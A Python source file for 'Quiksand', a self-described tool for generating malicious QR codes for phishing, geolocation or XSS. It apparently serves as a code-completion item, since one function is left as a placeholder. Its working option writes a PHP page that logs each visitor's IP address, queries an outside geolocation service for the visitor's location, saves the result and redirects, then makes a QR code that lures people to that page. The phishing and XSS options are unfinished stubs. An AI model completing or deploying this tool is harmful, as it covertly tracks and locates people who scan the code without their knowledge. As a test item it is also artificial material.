#!/usr/bin/python

import qrcode # PIL qrcode library
import requests # obtain ip information
import os
import subprocess
from hashlib import md5
from datetime import datetime

#defaults
QUIKSAND = True
workspace = os.getcwd()

def banner(): # void ret
    print('''Quiksand - A portable Python utility for generating malicious QR codes for phishing, geolocation, or XXS using PIL.''')
    print(f"{'Developed by Amani Jackson and Diante Jackson':^115}")
    print(f"{'Rolan Group':^115}")
    print('-------------------------------------------------------------------------------------------------------------------')
    print("note: please ensure that the address is internet accessible before deploying to ensure success.")

def die(workspace, error_code): # cleanup function
    os.chdir(workspace)
    exit(error_code)

def check_con(): # string ret
    # Send an HTTP GET request to“ https://api.ipify.org If the request is successful, decode it into a UTF-8 encoded string and return it.
    <FILL_HERE>

def display_opts(): # void ret
    print("Options:")
    print('\u21A0 (1) IP Geolocation\n')
    print('\u21A0 (2) XXS\n')
    print('\u21A0 (3) Phishing\n')
    print('\u21A0 (help) Print Options List\n')
    print('\u21A0 (q/quit/exit) Exit QuikSand\n')

def ip_geolocate(ext_ip): # void ret
    print("IP Geolocation Tool")
    print("[*] Set the \"Location:\" header (the site you will redirect to):")
    location = input("quiksand:ipgeo:Location> ")
    print("[*] Set the location that the QR Code points to (default: http://{}/):".format(ext_ip))
    link = input("quiksand:ipgeo:Link> ")
    if link == "": link = "http://%s/" % ext_ip

    # create folder, write php file and qr code to disk
    try:
        dir = os.getcwd() + "/XSS_" + md5(str(datetime.now()).encode()).hexdigest() # hash time for folder name
        os.mkdir(dir, mode=0o700)
        print("[*] Directory created: {}".format(dir))
        os.chdir(dir)
    except:
        print("[!] Error creating folder! Exiting...")
        exit(-2) # should never reach this but who knows...

    payload = """<?php
    $victim = $_SERVER['REMOTE_ADDR'];

$json = file_get_contents('http://ip-api.com/json/$victim');
$f = fopen('$victim.txt', 'w+');
fwrite($f, $json);
fclose($f);

header('Location: {})
?>
    """.format(location)
    with open("index.php", 'w') as f:
        f.write(payload)
    print("[+] PHP Payload created! This payload will query the victim's data and write it to a local text file in your workspace.")

    print("[*] Generating QR code pointing to {}!".format(link))
    stager = qrcode.make(link)
    stager.save("qrcode.png")
    print("[+] QR Code made succesfully!")
    os.chdir('..')

    # check for active desktop environment
    if os.getenv('XDG_CURRENT_DESKTOP'):
        print("[*] Opening file explorer...")
        subprocess.Popen(["xdg-open", dir], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    return
    

if __name__ == "__main__":
    banner()
    ext_ip = check_con()
    print("[*]External IP for current workspace: {}\n".format(ext_ip))
    display_opts()
    while QUIKSAND:
        opt = input("quiksand> ")
        match opt.lower():
            case "1":
                ip_geolocate(ext_ip)
            case "2":
                print("[!] Under development...")
                #xxs_attack()
            case "3":
                print("[!] Under development...")
                #phishing_attack()
            case "help":
                display_opts()
            case "quit":
                print("[!] Exiting program!")
                QUIKSAND = False
            case "exit":
                print("[!] Exiting program!")
                QUIKSAND = False
            case "q":
                print("[!] Exiting program!")
                QUIKSAND = False
            case _:
                print("[-] Option not found. Please try again.")
    die(workspace, 0)